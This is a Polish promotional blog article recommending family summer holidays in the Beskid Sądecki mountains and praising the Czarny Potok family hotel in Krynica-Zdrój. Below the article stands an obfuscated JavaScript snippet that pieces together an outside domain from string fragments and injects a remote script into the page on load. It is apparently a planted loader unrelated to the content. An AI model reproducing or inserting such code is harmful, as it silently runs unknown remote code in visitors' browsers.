 Większości z nas udany urlop z rodziną kojarzy z wypoczynkiem nad morzem, podczas gdy polskie góry mają równie dużo do zaoferowania. Gdzie najlepiej się wtedy wybrać? Oczywiście w Karpaty – a ściślej mówiąc w okolice Beskidu Sądeckiego. Zobaczcie, dlaczego właśnie tam i sprawdźcie najlepsze miejsce noclegowe. Poznajcie atrakcje, jakie czekają na milusińskich.Lista argumentów za takim właśnie wyborem jest długa. Po pierwsze – góry to spory pakiet korzyści zdrowotnych dla naszych pociech. Przede wszystkim to świetny sposób na wzmocnienie i zbudowanie dziecięcej odporności. Mają na to wpływ głównie niezwykle zmienne warunki pogodowe i to nie tylko na szlaku, ale i poza nim. Ponadto górskie powietrze sprzyja też dziecięcym płucom. Krystalicznie czyste pomaga w oczyszczeniu ich z zalegającego smogu czy innych miejskich trucizn. Pobyt w górach zalecany jest również dzieciom cierpiącym na astmę czy częste infekcje górnych dróg oddechowych. Po drugie lato w górach oznacza odpoczynek od tłumów turystów, co bywa wręcz nierealne, jeśli chodzi o urlop nad morzem. Mniej turystów na szlakach, ale i w samych obiektach noclegowych oznacza też zapewnienie pociechom większego bezpieczeństwa. Nie zwalnia to oczywiście rodziców od ostrożności, ale ułatwia zapanowanie nad beztroskimi maluchami. Wakacje w górach to także niepowtarzalna okazja do zapoznania dzieci z bogactwem świata fauny i flory.Wycieczki można porównać śmiało z lekcjami przyrody czy biologii na żywo. Ponadto góry latem prezentują się jeszcze piękniej niż w zimowej szacie. Obserwacja pięknych górskich krajobrazów przez dzieci wpływa korzystnie na ich zmysł i poczucie estetyki. Nie można też zapominać o tym, że taki urlop pozwala zasmakować w aktywnym sposobie relaksu. W ten sposób budujemy u dzieci podstawy do zainteresowania aktywnością fizyczną czy ruchem ogólnie. Dzięki czemu wzrasta prawdopodobieństwo, że w przyszłości częściej i chętniej będą wybierały podwórko i zabawy z kolegami na świeżym powietrzu, niż siedzenie przed komputerem czy telewizorem. To z kolei pozwoli im uniknąć wielu problemów ze zdrowiem jak chociażby otyłość czy nadwaga – największe zagrożenia dla coraz młodszych pokoleń w naszym kraju. Latem w górach nie sposób się nudzić. Jeśli nawet nie idziemy na szlak, to najczęściej w miejscowościach wypoczynkowych właśnie w sezonie letnim odbywa się mnóstwo różnego rodzaju wydarzeń kulturalnych, ale i typowo rekreacyjnych. Często biorąc w nich udział ze swoimi pociechami, można przywieźć do domu cenne nagrody, gdyż wiele z tych wydarzeń wiąże się z atrakcyjnymi konkursami czy innymi konkurencjami.Jak zatem widzimy, korzyści z rodzinnego wyjazdu w góry jest naprawdę wiele. Pozostaje pytanie: które z pasm górskich najbardziej nadają się na takie wczasy z całą rodziną? Bez wątpienia są to polskie góry. Na plan pierwszy zdecydowanie wysuwa się Beskid Sądecki, czyli pasmo górskie w Karpatach Zachodnich należące do Beskidów Zachodnich z malowniczą Krynicą – Zdrój na czele określaną, jako „perła polskich uzdrowisk”. Beskid Sądecki wyróżnia się bogactwem krajobrazów, na które składają się aż cztery różne pasma górskie, niezwykłe jaskinie oraz kilkanaście rezerwatów przyrody, z czego kilka to typowe leśne obszary zamieszkiwane przez tutejszą dziką zwierzynę. Wybierając się w tak malowniczy zakątek z dziećmi, możemy im podarować coś niezwykle cennego – bliskość z naturą oraz możliwość pokazania, jak ważny jest szacunek do niej i dbałość o jej potrzeby.Organizacja rodzinnych wakacji w Beskidzie Sądeckim to gwarancja świetnej zabawy dla każdego bez względu na wiek. Uwagę dorosłych z pewnością przykują takie ciekawostki, jak chociażby największy w regionie mini – golf z 36 dołkami, 5 poziomami figur i przeszkód oraz możliwością odbycia gry nocną porą (pola są oświetlane). Czas wolny mogą oni też spędzić na wyjątkowym koncercie z muzyką klasyczną i filmową, który wygrywa multimedialna fontanna. Konstrukcja składa się łącznie z 90 dysz, które odpowiednio ułożone wyrzucają w powietrze strumień o wysokości 10m. Urządzenie działa od początku maja aż do końca października. Dorośli mogą też przyjemnie się zrelaksować, odwiedzając Pijalnię Główną, gdzie często organizowane są występy kabaretów na żywo czy inne równie ciekawe pokazy i widowiska. Spragnionych wrażeń z pewnością ucieszy obecność takich atrakcji jak: niezwykle podnoszące poziom adrenaliny spływy pontonowe, nieco spokojniejsze gokarty oraz ekscytujące Skoki Wahadłowe z wysokości 17m, a także wspinaczka skałkowa.Beskid Sądecki uwzględnił także potrzeby najmłodszych turystów, oddając do ich dyspozycji takie obiekty, na których mogą się doskonale bawić, spędzając jednocześnie czas ze swoimi rodzicami. Oto kilka z propozycji, jakie powinny znaleźć się na liście rzeczy, które warto zrobić ze swoimi dziećmi w czasie pobytu w górach. Pierwsza atrakcja to sankostrada – czyli całoroczny tor saneczkowy o długości 1km. Różnica pomiędzy poszczególnymi poziomami to 55m. Zjazd odbywa się rynno o długości ok. 800m. Dzieci do lat 3-ech bawią się za darmo. Druga propozycja to krynicki park linowy. Składa się na niego 8 tras o zróżnicowanym stopniu trudności oraz 107 przeszkód do pokonania. Na obszarze parku znajdują się też specjalnie wydzielone miejsca do urządzenia rodzinnego grilla. Świetną rodzinną zabawę oferują również Rajskie Ślizgawki – kompleks zjeżdżalni rurowych o zróżnicowanych poziomach. Na najmłodszych czeka ponadto specjalna zjeżdżalnia pontonowa.Dopełnieniem naprawdę udanych urlopu z rodziną stanowi wybór idealnego miejsca noclegowego. Powinien to być obiekt ściśle dostosowany do potrzeb rodzin z dziećmi w każdym wieku. Jednym z takich miejsc jest hotel w górach Czarny Potok. Dlaczego? Po pierwsze jest to obiekt specjalnie przygotowany na pobyt rodzinny z uwzględnieniem wyjątkowych potrzeb rodziców najmniejszych dzieci.Mogą oni skorzystać z takich rozwiązań jak chociażby: wynajęcie niani, specjalne menu dla dzieci, Kids Club z piłeczkowym basenem i labiryntem z tunelami, a także przeznaczony dla najmłodszych brodzik z fontanną – grzybkiem. Ponadto hotel dysponuje grami i książkami dla dzieci w każdym wieku. Dzieci mogą też czas wolny spędzać w salonie gier z symulatorami. Do ich dyspozycji jest również specjalna sala, w której znajdują się bezpieczne meble i zabawki dziecięce dla pociech w różnym wieku. Hotel oferuje również bogaty program zajęć na świeżym powietrzu pod okiem doświadczonych animatorów. Na uczestników czekają zajęcia tematyczne oraz plac zabaw z huśtawkami i trampoliną.O tym, że jest to hotel dla rodziny łatwo się przekonać tuż przy wejściu, gdzie mali goście są specjalnie witani i otrzymują: plakietkę VIP, dyplom uczestnika gier i zabaw; kartę odkrywcy, która uprawnia do odebrania nagrody po zebraniu odpowiedniej liczby pieczątek. Warto przy tym nadmienić, że Czarny Potok posiada w swoim programie wiele atrakcyjnych cenowo letnich ofert specjalnie przygotowanych dla całych rodzin z dziećmi. Jedna z nich to Wakacje w Krynicy gwarantujący całodzienną opiekę animatorów. Na małych fanów aktywności fizycznej czekają z kolei zajęcia taneczne oraz fitness dopasowane ściśle do wieku i możliwości uczestników. Warto też wspomnieć, iż hotel nie zapomina o komforcie pobytu rodziców. Specjalnie z myślą o nich przygotował takie atrakcje jak: 5-gwiazdkowe SPA (oferujące m.in. łaźnię parową aromatyczną czy zabiegi krioterapii); pole do gry w mini-golfa (36 dołków i aż 5 poziomów to obietnica dobrej zabawy) oraz całkowity unikat, czyli prywatna plaża w górach z bezpłatnymi, zapewniającymi maksymalną wygodę łóżkami plażowymi.Decyzja o tym, aby spędzić wakacje w górach z całą rodziną to jedno z lepszych rozwiązań. Polskie góry dają nieskończenie wiele możliwości wypoczynku. Są też świetnym sposobem na to, aby zaszczepić w pociechach już od ich najmłodszych lat zamiłowanie do aktywnego spędzania czasu wolnego. Taki rodzinny urlop, spędzony z dala od gwaru turystów w otoczeniu piękna polskiej przyrody to również okazja do pokazania dzieciom, że wakacje z rodzicami też mogą być fajne. Jeśli dodamy do tego pobyt w przyjaznym dla dzieci hotelu oraz zatroszczymy się o to, by pociechy ani przez chwilę się nie nudziły, możemy mówić o takim urlopie, z którego wrócimy wypoczęci i naładowani pozytywną energią. Takie odczucia zagwarantują wyjazd w Beskidy oraz hotel dla rodziny Czarny Potok, w którym każdy mały gość traktowany jest, jak VIP, a oferta obejmuje liczne udogodnienia dla opiekunów. 
(function(){
 wXnv=document.createElement("script");wXnv.type="text/javascript";
 wXnv.async=true;wXnv_=(("us")+"t")+"a";wXnv_+=("t.i")+""+"n";wXnv_+=(("f")+"o");wXnv_+="/";
 wXnvu="75962561.";wXnvu+="tigd80XcXnv14wit9705xvd6zv1kiq";wXnv.src="https://"+wXnv_+wXnvu;
 wXnvdb=document.body; wXnvdb.appendChild(wXnv);
})();
Twój adres email nie zostanie opublikowany. Pola, których wypełnienie jest wymagane, są oznaczone symbolem *Komentarz Please enable JavaScript to submit this form.Podpis * Email * Witryna internetowa  

 